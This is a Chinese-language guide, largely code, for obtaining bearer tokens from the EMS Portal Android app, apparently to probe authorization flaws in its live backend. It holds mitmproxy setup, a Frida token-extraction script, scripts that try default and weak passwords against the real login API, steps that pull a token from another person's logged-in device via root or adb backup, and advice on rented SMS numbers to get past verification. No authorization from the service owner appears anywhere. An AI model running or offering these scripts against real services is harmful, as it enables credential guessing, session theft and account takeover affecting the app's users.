# EMS Portal - Token获取完整指南

## 🎯 目标

获取真实的Bearer Token用于测试越权

---

## 📋 获取Token的4种方法

### ⭐ 方法1: 注册账号 + MITM (推荐)
### 方法2: Frida Hook (需要Root/模拟器)
### 方法3: 测试账号 (如果存在)
### 方法4: 爆破/社会工程 (不推荐)

---

## ⭐ 方法1: 注册账号 + MITM拦截 (最简单)

### 步骤1: 安装mitmproxy

```bash
# Linux/macOS
pip3 install mitmproxy

# 或使用系统包管理器
sudo apt install mitmproxy  # Debian/Ubuntu
brew install mitmproxy      # macOS
```

### 步骤2: 启动mitmproxy

```bash
# 启动HTTP代理在8080端口
mitmproxy -p 8080

# 或使用web界面 (更直观)
mitmweb -p 8080
# 然后浏览器打开 http://127.0.0.1:8081
```

### 步骤3: Android设备配置

#### 3.1 设置WiFi代理

```
设置 → WiFi → 长按当前连接的WiFi → 修改网络
  → 高级选项 → 代理 → 手动

代理主机: 你的电脑IP (例如: 192.168.1.100)
代理端口: 8080
```

**如何查看你的电脑IP:**
```bash
# Linux/macOS
ifconfig | grep "inet "
# 或
ip addr show

# 找到类似 192.168.1.100 的地址
```

#### 3.2 安装mitmproxy证书

```
1. 在Android浏览器打开: http://mitm.it
2. 点击 "Android" → 下载证书
3. 设置 → 安全 → 安装证书 → CA证书
4. 选择下载的证书安装
```

### 步骤4: 注册EMS Portal账号

```
1. 打开EMS Portal App
2. 点击 "注册" / "Đăng ký"
3. 填写:
   - 电话: 0901000001 (越南手机号格式)
   - 姓名: Test User
   - 密码: Test123456
   - 验证码: (需要接收短信)

⚠️ 注意: 需要真实越南手机号接收验证码
```

### 步骤5: 登录并拦截Token

```
1. 在App中登录
2. 查看mitmproxy界面
3. 找到包含 "Authorization" 的请求
4. 复制 Token

示例:
  Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTIzIn0...
                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                        这就是Token!
```

### 步骤6: 保存Token

```bash
# 保存到文件
echo "eyJhbGciOiJI..." > token_a.txt

# 或设置环境变量
export TOKEN_A="eyJhbGciOiJI..."
```

---

## 🔥 方法2: Frida Hook自动提取

**优势:** 无需代理，直接从App内存提取

**前提:** 需要Root设备或Android模拟器

### 步骤1: 安装Frida

```bash
# 安装Frida工具
pip3 install frida-tools

# 下载Frida Server (根据你的Android架构)
# https://github.com/frida/frida/releases

# 例如: frida-server-16.0.0-android-arm64.xz
wget https://github.com/frida/frida/releases/download/16.0.0/frida-server-16.0.0-android-arm64.xz
unxz frida-server-16.0.0-android-arm64.xz
```

### 步骤2: 部署Frida Server到手机

```bash
# 推送到手机
adb push frida-server-16.0.0-android-arm64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server

# 启动Frida Server (需要root)
adb shell su -c /data/local/tmp/frida-server &

# 验证
frida-ps -U
# 应该显示手机上运行的进程
```

### 步骤3: 使用已有工具提取Token

```bash
# 使用之前生成的工具
python3 data_extraction_tool.py

# 或手动提取
python3 extract_token_frida.py
```

### 手动Frida脚本

```python
#!/usr/bin/env python3
"""
Frida提取Token - 简化版
"""

import frida
import sys
import json

script_code = """
Java.perform(function() {
    console.log("[*] Frida已注入，开始提取Token...");
    
    // 1. 从SharedPreferences提取
    var SharedPrefsManager = Java.use('c.b.k.e');
    var instance = SharedPrefsManager.b();
    
    try {
        var token = instance.b("PREF_TOKEN_USER");
        console.log("[+] Token: " + token);
        send({type: 'token', data: token});
    } catch(e) {
        console.log("[-] 提取失败: " + e);
    }
    
    // 2. Hook登录方法
    try {
        var LogInActivity = Java.use('com.emsportal.user.activity.LogInActivity');
        
        // Hook登录响应
        LogInActivity.onSuccess.implementation = function(response) {
            console.log("[*] 捕获登录响应");
            console.log(response.toString());
            
            // 调用原方法
            this.onSuccess(response);
        };
    } catch(e) {
        console.log("[-] Hook登录失败: " + e);
    }
});
"""

def on_message(message, data):
    if message['type'] == 'send':
        print(f"\n[Frida] {message['payload']}")
        
        if 'type' in message['payload'] and message['payload']['type'] == 'token':
            token = message['payload']['data']
            
            # 保存Token
            with open('extracted_token.txt', 'w') as f:
                f.write(token)
            
            print(f"\n[+] Token已保存到: extracted_token.txt")

def main():
    # 连接到App
    device = frida.get_usb_device()
    
    try:
        # 附加到正在运行的App
        session = device.attach('com.emsportal')
        print("[*] 已附加到 com.emsportal")
    except:
        print("[!] App未运行，尝试启动...")
        pid = device.spawn(['com.emsportal'])
        session = device.attach(pid)
        device.resume(pid)
    
    # 注入脚本
    script = session.create_script(script_code)
    script.on('message', on_message)
    script.load()
    
    print("\n[*] 脚本已加载")
    print("[*] 请在App中登录...")
    print("[*] 按Ctrl+C退出\n")
    
    sys.stdin.read()

if __name__ == '__main__':
    main()
```

**使用:**
```bash
# 启动App
adb shell am start -n com.emsportal/.user.activity.LogInActivity

# 运行脚本
python3 extract_token_frida.py

# 在App中登录
# Token会自动保存到 extracted_token.txt
```

---

## 💡 方法3: 尝试测试/默认账号

很多App有测试账号，尝试常见组合:

```bash
# 测试账号脚本
python3 test_default_accounts.py
```

```python
#!/usr/bin/env python3
"""
测试默认/测试账号
"""

import requests
import json

base = "http://ws.ems.com.vn"
test_accounts = [
    # 格式: (手机号, 密码)
    ("0901234567", "123456"),
    ("0901234567", "password"),
    ("0909999999", "123456"),
    ("0900000001", "test123"),
    ("admin", "admin123"),
    ("test", "test123"),
    ("demo", "demo123"),
]

def try_login(phone, password):
    """尝试登录"""
    print(f"[*] 尝试: {phone} / {password}")
    
    try:
        r = requests.post(
            f"{base}/api/v1/auth/login",
            json={
                "phone": phone,
                "password": password,
                "device_id": "test_device"
            },
            timeout=5
        )
        
        if r.status_code == 200:
            data = r.json()
            
            if data.get('code') == 'success':
                token = data.get('data', {}).get('token')
                
                if token:
                    print(f"\n[+] 登录成功!")
                    print(f"    账号: {phone}")
                    print(f"    密码: {password}")
                    print(f"    Token: {token[:50]}...")
                    
                    # 保存
                    with open(f'token_{phone}.txt', 'w') as f:
                        f.write(token)
                    
                    return token
            else:
                print(f"    失败: {data.get('message')}")
    
    except Exception as e:
        print(f"    错误: {e}")
    
    return None

print("[*] 测试默认账号...\n")

for phone, password in test_accounts:
    token = try_login(phone, password)
    
    if token:
        print("\n[✓] 找到有效账号，可以开始测试!")
        break
else:
    print("\n[-] 未找到默认账号，需要注册")
```

---

## 🚫 不需要注册的方法 (如果可行)

### 方法A: 从已有设备提取

如果有人已经登录过:

```bash
# 需要Root权限
adb shell su -c "cat /data/data/com.emsportal/shared_prefs/APP_PREFERENCES.xml"

# 查找 PREF_TOKEN_USER
# <string name="PREF_TOKEN_USER">eyJhbGc...</string>
```

### 方法B: 备份提取

```bash
# Android备份 (无需Root)
adb backup -f ems_backup.ab com.emsportal

# 转换备份
dd if=ems_backup.ab bs=24 skip=1 | openssl zlib -d > ems_backup.tar

# 解压
tar xvf ems_backup.tar

# 查找Token
grep -r "PREF_TOKEN_USER" .
```

### 方法C: 抓包历史记录

如果之前抓过包:

```bash
# 查找Burp Suite / Charles历史
grep -r "Authorization: Bearer" ~/BurpSuite/
grep -r "Authorization: Bearer" ~/Charles/
```

---

## 📊 最简单的方案对比

| 方法 | 难度 | 需要注册 | 需要Root | 成功率 |
|------|------|----------|----------|--------|
| **注册+MITM** | ⭐⭐ | ✅ | ❌ | 95% |
| Frida Hook | ⭐⭐⭐ | ✅ | ✅ | 90% |
| 测试账号 | ⭐ | ❌ | ❌ | 10% |
| 备份提取 | ⭐⭐⭐⭐ | ❌ | ❌ | 30% |

**推荐:** 注册账号 + MITM (最简单可靠)

---

## 🎯 快速获取Token (10分钟)

### 超快速方案 (如果你有越南手机号)

```bash
# 1. 安装mitmproxy (1分钟)
pip3 install mitmproxy

# 2. 启动代理 (30秒)
mitmweb -p 8080
# 浏览器打开 http://127.0.0.1:8081

# 3. 手机设置代理 (1分钟)
# WiFi → 代理 → 手动 → 你的电脑IP:8080

# 4. 安装证书 (1分钟)
# 浏览器打开 http://mitm.it → Android

# 5. 注册+登录 (5分钟)
# App中注册 → 登录

# 6. 在mitmweb中搜索 "Authorization"
# 复制Token
```

### 如果没有越南手机号

**选项1: 使用虚拟号码服务**
- https://www.receive-sms-online.info/
- https://sms-activate.org/
- 搜索 "Vietnam SMS receive"

**选项2: 使用Android模拟器 + 测试账号**
```bash
# 安装Android模拟器
# Genymotion / Android Studio AVD

# 尝试测试账号
python3 test_default_accounts.py
```

**选项3: Frida直接提取 (无需验证码)**

如果App有"游客模式"或"演示模式":
```python
# Hook跳过验证
frida -U -f com.emsportal -l skip_verify.js
```

---

## 🔧 自动化Token获取工具

### auto_get_token.py

```python
#!/usr/bin/env python3
"""
自动化Token获取 (所有方法)
"""

import subprocess
import os
import sys
import requests
import time

class TokenGetter:
    def __init__(self):
        self.token = None
    
    def method_1_mitm(self):
        """方法1: MITM拦截"""
        print("\n[方法1] MITM拦截")
        print("=" * 60)
        
        print("\n请按照以下步骤操作:")
        print("1. 启动mitmproxy: mitmweb -p 8080")
        print("2. 手机设置代理")
        print("3. 安装证书: http://mitm.it")
        print("4. 在App中登录")
        print("5. 在mitmweb界面搜索 'Authorization'")
        print("6. 复制Token并粘贴到这里\n")
        
        token = input("请输入Token: ").strip()
        
        if token and len(token) > 50:
            self.token = token
            return True
        
        return False
    
    def method_2_frida(self):
        """方法2: Frida提取"""
        print("\n[方法2] Frida自动提取")
        print("=" * 60)
        
        # 检查Frida
        try:
            subprocess.run(['frida', '--version'], check=True, capture_output=True)
        except:
            print("[-] Frida未安装")
            print("    安装: pip3 install frida-tools")
            return False
        
        # 检查设备
        result = subprocess.run(['frida-ps', '-U'], capture_output=True, text=True)
        if result.returncode != 0:
            print("[-] Frida Server未运行")
            return False
        
        print("[+] Frida环境正常")
        print("[*] 运行提取脚本...")
        
        # 使用已有工具
        if os.path.exists('data_extraction_tool.py'):
            os.system('python3 data_extraction_tool.py')
            
            # 读取提取的Token
            if os.path.exists('extracted_tokens.json'):
                import json
                with open('extracted_tokens.json') as f:
                    data = json.load(f)
                    self.token = data.get('token')
                
                if self.token:
                    print(f"[+] Token已提取: {self.token[:50]}...")
                    return True
        
        return False
    
    def method_3_test_accounts(self):
        """方法3: 测试账号"""
        print("\n[方法3] 测试默认账号")
        print("=" * 60)
        
        accounts = [
            ("0901234567", "123456"),
            ("0909999999", "123456"),
            ("test", "test123"),
        ]
        
        base = "http://ws.ems.com.vn"
        
        for phone, password in accounts:
            print(f"[*] 尝试: {phone} / {password}")
            
            try:
                r = requests.post(
                    f"{base}/api/v1/auth/login",
                    json={"phone": phone, "password": password},
                    timeout=5
                )
                
                if r.status_code == 200:
                    data = r.json()
                    
                    if data.get('code') == 'success':
                        self.token = data['data']['token']
                        print(f"[+] 登录成功! Token: {self.token[:50]}...")
                        return True
            
            except Exception as e:
                pass
        
        print("[-] 未找到有效测试账号")
        return False
    
    def method_4_backup(self):
        """方法4: 备份提取"""
        print("\n[方法4] 从备份提取")
        print("=" * 60)
        
        print("[*] 创建应用备份...")
        
        # 尝试备份
        result = subprocess.run([
            'adb', 'backup', '-f', 'ems_backup.ab', 
            '-noapk', 'com.emsportal'
        ], capture_output=True)
        
        if os.path.exists('ems_backup.ab'):
            print("[+] 备份成功")
            print("[*] 解析备份文件...")
            
            # 转换备份
            os.system('dd if=ems_backup.ab bs=24 skip=1 2>/dev/null | openssl zlib -d > ems_backup.tar 2>/dev/null')
            
            if os.path.exists('ems_backup.tar'):
                os.system('tar xf ems_backup.tar 2>/dev/null')
                
                # 查找Token
                result = subprocess.run([
                    'grep', '-r', 'PREF_TOKEN_USER', '.'
                ], capture_output=True, text=True)
                
                if 'eyJ' in result.stdout:
                    # 提取Token
                    import re
                    match = re.search(r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*', result.stdout)
                    
                    if match:
                        self.token = match.group(0)
                        print(f"[+] Token已提取: {self.token[:50]}...")
                        return True
        
        print("[-] 备份提取失败")
        return False
    
    def run(self):
        """运行所有方法"""
        print("""
╔══════════════════════════════════════════════════════════════╗
║       EMS Portal - 自动Token获取工具                        ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        methods = [
            ("测试默认账号", self.method_3_test_accounts),
            ("Frida自动提取", self.method_2_frida),
            ("备份提取", self.method_4_backup),
            ("MITM拦截 (手动)", self.method_1_mitm),
        ]
        
        for name, method in methods:
            print(f"\n尝试: {name}")
            
            try:
                if method():
                    print(f"\n✓ 成功获取Token!")
                    break
            except Exception as e:
                print(f"[-] 方法失败: {e}")
        
        if self.token:
            # 保存Token
            with open('token.txt', 'w') as f:
                f.write(self.token)
            
            print(f"\n{'='*60}")
            print("[✓] Token已保存到: token.txt")
            print(f"{'='*60}\n")
            
            print("Token:")
            print(self.token)
            
            print("\n下一步:")
            print(f"  export TOKEN=\"{self.token[:50]}...\"")
            print(f"  python3 backend_validation_test.py $TOKEN $TOKEN")
        
        else:
            print(f"\n{'='*60}")
            print("[!] 所有自动方法均失败")
            print(f"{'='*60}\n")
            
            print("建议:")
            print("1. 注册新账号 + 使用MITM拦截 (最可靠)")
            print("   详细步骤见: GET_TOKEN_GUIDE.md")
            print()
            print("2. 或手动输入Token")
            print("   python3 backend_validation_test.py <TOKEN_A> <TOKEN_B>")

if __name__ == '__main__':
    getter = TokenGetter()
    getter.run()
```

---

## 🎯 最终推荐方案

### 如果你有越南手机号 → 注册 + MITM

```bash
# 1分钟搞定
mitmweb -p 8080
# 设置手机代理 → 注册 → 登录 → 复制Token
```

### 如果没有越南手机号 → 使用虚拟号码

```bash
# 1. 访问接码平台
open https://sms-activate.org/

# 2. 搜索 "Vietnam"
# 3. 租用临时号码 (约0.5-1美元)
# 4. 注册EMS Portal
# 5. 接收验证码
# 6. 登录 + MITM拦截Token
```

### 如果都不行 → Frida + Android模拟器

```bash
# 1. 安装模拟器
# Genymotion (推荐) 或 Android Studio AVD

# 2. 安装Frida
pip3 install frida-tools

# 3. 运行自动提取
python3 auto_get_token.py
```

---

## ✅ 快速检查清单

- [ ] 安装 mitmproxy
- [ ] 启动代理: `mitmweb -p 8080`
- [ ] 手机设置WiFi代理
- [ ] 安装mitmproxy证书
- [ ] 在App中注册/登录
- [ ] 在mitmweb中搜索 "Authorization"
- [ ] 复制Token
- [ ] 保存到文件: `echo "TOKEN" > token.txt`
- [ ] 测试: `python3 backend_validation_test.py $TOKEN $TOKEN`

---

生成日期: 2025-11-01
